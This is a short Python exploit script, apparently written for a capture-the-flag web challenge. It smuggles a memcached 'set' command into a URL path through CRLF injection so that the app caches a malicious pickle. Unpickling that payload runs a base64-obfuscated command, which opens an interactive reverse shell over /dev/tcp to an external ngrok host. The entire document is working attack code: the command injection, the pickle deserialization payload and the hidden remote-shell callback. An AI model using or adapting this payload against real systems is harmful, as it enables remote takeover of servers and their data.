import requests
import pickle, os
import urllib.parse
import base64
class RCE:
    def __reduce__(self):
        cmd = ('echo c2ggLWkgPiYgL2Rldi90Y3AvNi50Y3Aubmdyb2suaW8vMTk1MjIgMD4mMQ==|base64 -d|bash')
        return os.system, (cmd,)

url = "http://127.0.0.1:5000"

if __name__ == '__main__':

    path = f"/calc/add/123/123"

    pickledPayload = pickle.dumps(RCE(), 1)
    len_payload = len(pickledPayload)
    print(len_payload)


    set_command = b"\r\nset uwsgi_file__app_chall._add_1_1233 1 60 111"+ b"\r\n" + pickledPayload + b"\r\n"

    final_path = path + urllib.parse.quote_from_bytes(set_command)

    print(url +  final_path)
    print(requests.get(url +  final_path).text)
    print(requests.get(url + "/calc/add/1/1233").text)